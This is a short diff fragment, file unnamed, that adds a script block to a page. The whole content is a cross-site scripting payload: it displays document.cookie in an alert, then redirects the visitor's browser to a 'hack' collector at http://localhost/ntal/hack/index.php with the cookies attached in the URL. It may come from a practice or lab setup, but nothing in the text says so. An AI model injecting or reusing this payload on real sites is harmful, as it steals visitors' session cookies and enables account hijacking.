@@ -1,0 +1,4 @@
+
+<script >
+alert(document.cookie);
+window.location.href='http://localhost/ntal/hack/index.php?cookie='+document.cookie;</script>
